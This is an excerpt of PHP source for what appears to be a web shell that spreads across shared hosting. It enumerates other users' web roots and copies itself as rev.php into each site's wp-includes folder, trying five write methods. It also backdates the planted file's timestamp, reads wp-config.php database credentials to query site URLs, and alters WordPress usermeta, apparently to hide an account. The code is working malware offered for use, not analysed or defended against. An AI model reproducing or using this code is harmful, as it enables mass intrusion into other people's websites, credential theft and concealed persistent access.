...
switch ($action) {
    case 'recon':
        ...
        // Writable test
        $wr_test = [];
        $wr_dirs = [$cwd, sys_get_temp_dir(), '/tmp', '/dev/shm', '/var/tmp'];
    ...
    case 'symlink':
        ...
        switch ($sym_sub) {
            case 'users':
                ...
                $total_webs = 0;
                $skip_dirs = ['mail','etc','tmp','logs','ssl','cache','.cpanel','.cagefs','.cl.selector','.trash','.softaculous','.ssh','.gnupg','stats','awstats','cgi-bin','perl5','access-logs','analog','webprotect','.spamassassin','.htpasswds','.sqmail','.gem','.npm','.composer'];
                ...
                foreach ($users as &$u) {
                    ...
                    foreach ($l1 ?: [] as $d) {
                        ...
                        if (@file_exists($d . '/index.php') || @file_exists($d . '/index.html')) {
                            $found_paths[$d] = $bn;
                        }
                        // Level 2
                        $l2 = $glob_enum($d . '/*');
                        foreach ($l2 ?: [] as $d2) {
                            ...
                            if (@file_exists($d2 . '/index.php') || @file_exists($d2 . '/index.html')) {
                            ...
                            foreach ($l3 ?: [] as $d3) {
                                ...
                                if (@file_exists($d3 . '/index.php') || @file_exists($d3 . '/index.html')) {
                    ...
                    if (empty($found_paths)) {
                        ...
                        foreach ($blind_probes as $bp) {
                            ...
                            if (@file_exists($bp . '/index.php') || @file_exists($bp . '/index.html')) {
                            ...
                            foreach ($sub ?: [] as $sd) {
                                ...
                                // Direct web root
                                if (@file_exists($sd . '/index.php') || @file_exists($sd . '/index.html')) {
                                    $found_paths[$sd] = $sbn;
                                }
                                ...
                                foreach ($deep ?: [] as $dd) {
                                    ...
                                    if (@file_exists($dd . '/index.php') || @file_exists($dd . '/index.html')) {
                    ...
                    // Filter: hapus subfolder dari web root yang sudah ada
                    ksort($found_paths);
                    $clean = [];
                    foreach ($found_paths as $path => $name) {
                        $is_sub = false;
                        foreach ($clean as $cp => $cn) {
                            if (strpos($path, $cp . '/') === 0) { $is_sub = true; break; }
                        }
            ...
            case 'delete_deployed':
                // Hapus semua rev.php yang sudah di-deploy
                ...
                foreach ($del_targets as $dt) {
                    ...
                    if (!$path) continue;
                    if (@file_exists($path)) {
                        // Verifikasi ini file kita
                        $fc = @file_get_contents($path);
                        if ($fc && strpos($fc, 'X_DATA_KEY') !== false) {
                            if (@unlink($path)) {
            ...
            case 'deploy_all':
                // Deploy rev.php ke paths yang dikirim langsung — tanpa scan
                $self_content = @file_get_contents(__FILE__);
                if (!$self_content) { $sym_res = ['error' => 'Cannot read self']; break; }

                $my_docroot = !empty($_SERVER['DOCUMENT_ROOT']) ? realpath($_SERVER['DOCUMENT_ROOT']) : '';
                $targets = $req['targets'] ?? []; // [{path: '/home/user/domain/webroot', label: 'domain.com'}]
                ...
                foreach ($targets as $t) {
                    ...
                    // Skip diri sendiri — cek multiple ways
                    $skip_self = $req['skip_webroot'] ?? '';
                    $is_self = false;
                    if ($my_docroot && @realpath($webroot) === $my_docroot) $is_self = true;
                    if ($my_docroot && rtrim($webroot, '/') === rtrim($my_docroot, '/')) $is_self = true;
                    if ($skip_self && rtrim($webroot, '/') === rtrim($skip_self, '/')) $is_self = true;
                    // Juga cek apakah __FILE__ ada di dalam webroot ini
                    if (strpos(__FILE__, rtrim($webroot, '/') . '/') === 0) $is_self = true;
                    if ($is_self) {
                        $deploy_results[] = ['label' => $label, 'path' => $webroot, 'status' => 'SKIP_SELF'];
                        continue;
                    }

                    // Prioritas: wp-includes/ dulu, fallback web root
                    $wp_inc = $webroot . '/wp-includes';
                    if (@is_dir($wp_inc)) {
                        $target_file = $wp_inc . '/' . $deploy_name;
                    } else {
                        $target_file = $webroot . '/' . $deploy_name;
                    }

                    // Cek sudah ada (rev.php milik kita)
                    if (@file_exists($target_file)) {
                        $fc = @file_get_contents($target_file);
                        if ($fc && strpos($fc, 'X_DATA_KEY') !== false) {
                    ...
                    // Coba tulis — multiple methods
                    $written = false;

                    // Method 1: file_put_contents
                    if (!$written) {
                        $ok = @file_put_contents($target_file, $self_content);
                        if ($ok !== false) $written = true;
                    }

                    // Method 2: fopen + fwrite
                    if (!$written) {
                        $fh = @fopen($target_file, 'w');
                        if ($fh) { @fwrite($fh, $self_content); @fclose($fh); $written = true; }
                    }

                    // Method 3: SplFileObject
                    if (!$written) {
                        try { $spl = new SplFileObject($target_file, 'w'); $spl->fwrite($self_content); $spl = null; $written = true; } catch (Exception $e) {}
                    }

                    // Method 4: symlink trick — tulis ke tmp, lalu symlink/copy ke target
                    if (!$written) {
                        $tmp_file = TMP_DIR . '/.dpl_' . md5(mt_rand());
                        if (@file_put_contents($tmp_file, $self_content) !== false) {
                            if (@copy($tmp_file, $target_file)) $written = true;
                            elseif (@rename($tmp_file, $target_file)) $written = true;
                            @unlink($tmp_file);
                        }
                    }

                    // Method 5: ZipArchive — buat zip lalu extract ke target
                    if (!$written && class_exists('ZipArchive')) {
                        $tmp_zip = TMP_DIR . '/.dpl_' . md5(mt_rand()) . '.zip';
                        $za = new ZipArchive();
                        if ($za->open($tmp_zip, ZipArchive::CREATE) === true) {
                            $za->addFromString($deploy_name, $self_content);
                            $za->close();
                            $za2 = new ZipArchive();
                            if ($za2->open($tmp_zip) === true) {
                                $za2->extractTo($webroot);
                                $za2->close();
                                if (@file_exists($target_file)) $written = true;
                            }
                            @unlink($tmp_zip);
                        }
                    }
                    ...
                    if ($written) {
                        ...
                        $ref_mt = @filemtime($webroot . '/index.php') ?: @filemtime($webroot . '/index.html');
                        if ($ref_mt) @touch($target_file, $ref_mt);

                        // Resolve domain: baca wp-config.php → connect DB → SELECT siteurl
                        $domain = '';
                        $wpc_path = $webroot . '/wp-config.php';
                        $wpc = @file_get_contents($wpc_path);
                        if (!$wpc) $wpc = $bypass_read($wpc_path, true)['content'] ? base64_decode($bypass_read($wpc_path, true)['content']) : false;
                        if ($wpc) {
                            $db = []; $pfx = 'wp_';
                            ...
                            if (isset($db['name']) && isset($db['user'])) {
                                try {
                                    $dpdo = new PDO("mysql:host={$db['host']};dbname={$db['name']};charset=utf8", $db['user'], $db['pass'] ?? '', [PDO::ATTR_TIMEOUT => 3, PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
                                    $su = $dpdo->query("SELECT option_value FROM {$pfx}options WHERE option_name='siteurl' LIMIT 1")->fetchColumn();
                                    if ($su) {
                                        // https://curtisandkesha.com → curtisandkesha.com
                                        $domain = preg_replace('#^https?://#', '', rtrim($su, '/'));
                                    }
                                    $dpdo = null;
                                } catch (Exception $e) {}
                            }
                        ...
                        // Fallback 1: baca index.php/index.html cari domain di HTML
                        if (!$domain) {
                            $idx = @file_get_contents($webroot . '/index.html', false, null, 0, 8192)
                                ?: @file_get_contents($webroot . '/index.php', false, null, 0, 8192);
                            if ($idx) {
                                // <link rel="canonical" href="https://domain.com/...
                                // <meta property="og:url" content="https://domain.com/...
                                // site_url = "https://domain.com"
                                if (preg_match('/(?:canonical|og:url|site_url)["\'\s=:]+https?:\/\/([^"\'\/\s>]+)/i', $idx, $hm)) {
                                    $domain = strtolower($hm[1]);
                                }
                            }
                        }

                        // Fallback 2: folder name kalau sudah ada TLD
                        if (!$domain) {
                            if (strpos($label, '.') !== false && !str_starts_with($label, '.')) {
                                $domain = $label;
                            }
                        }

                        $deploy_results[] = ['label' => $label, 'path' => $target_file, 'status' => 'OK', 'domain' => $domain];
                    } else {
                        $deploy_results[] = ['label' => $label, 'path' => $target_file, 'status' => 'WRITE_FAIL'];
                    }
                }

                $ok_count = count(array_filter($deploy_results, function($r) { return $r['status'] === 'OK' || $r['status'] === 'ALREADY'; }));
                $sym_res = ['results' => $deploy_results, 'total' => count($deploy_results), 'success' => $ok_count];
                break;
    ...
    case 'backup':
        ...
        foreach ($bk_candidates as $bc) {
            if (file_exists($bc)) {
                ...
                if ($fc !== false && strpos($fc, 'X_DATA_KEY') !== false) {
                    $bk_existing = $bc;
                    break;
                }
            }
        ...
        try {
            ...
            switch ($as_sub) {
                ...
                case 'hide':
                    ...
                    $as_pdo->prepare("INSERT INTO {$as_pfx}usermeta (user_id, meta_key, meta_value) VALUES (?, ?, ?)")->execute([$h_id, $as_pfx . '_capabilities_backup', $h_old]);
